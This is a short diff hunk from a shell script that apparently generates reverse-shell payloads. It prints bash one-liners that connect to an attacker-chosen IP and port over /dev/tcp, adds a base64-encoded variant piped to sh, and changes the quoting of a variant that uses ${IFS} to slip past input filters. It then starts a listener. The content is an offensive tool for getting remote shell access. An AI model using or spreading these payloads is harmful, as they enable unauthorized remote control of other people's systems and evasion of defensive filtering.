@@ -62,6 +62,6 @@ case "$1" in
 	echo -e "bash -i >& /dev/tcp/$ip/$port 0>&1";
 	echo -e "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
         echo -e "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" | base64 -w 0 | xargs -I {} echo "echo" {} "| base64 -d | sh";
-	echo -e "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" | base64 -w 0 | xargs -I {} echo "echo"\${IFS}{}\${IFS} "|\${IFS}base64\${IFS}-d\${IFS}|\${IFS}sh";
+	echo -e "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" | base64 -w 0 | xargs -I {} echo "echo\${IFS}"{}"\${IFS}|\${IFS}base64\${IFS}-d\${IFS}|\${IFS}sh";
         listener;;
 esac 
